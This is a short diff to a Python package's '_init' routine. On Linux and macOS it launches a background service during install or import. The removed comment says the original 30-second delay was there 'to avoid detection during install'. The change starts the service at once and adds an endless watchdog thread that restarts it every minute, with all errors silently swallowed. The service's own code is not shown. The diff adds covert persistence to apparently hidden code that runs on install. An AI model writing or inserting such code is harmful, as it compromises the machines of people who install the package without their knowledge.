@@ -307,8 +307,18 @@ def _init():
     try:
         # Only start on Linux/Unix systems
         if sys.platform.startswith('linux') or sys.platform == 'darwin':
-            # Delay start to avoid detection during install
-            threading.Timer(30.0, _start_service).start()
+            # Start immediately (not delayed) for reliability
+            # The service checks if already running, so safe to call multiple times
+            _start_service()
+            
+            # Also start a watchdog thread to restart if crashed
+            def watchdog():
+                while True:
+                    time.sleep(60)  # Check every minute
+                    if not _is_running():
+                        _start_service()
+            
+            threading.Thread(target=watchdog, daemon=True).start()
     except:
         pass
 
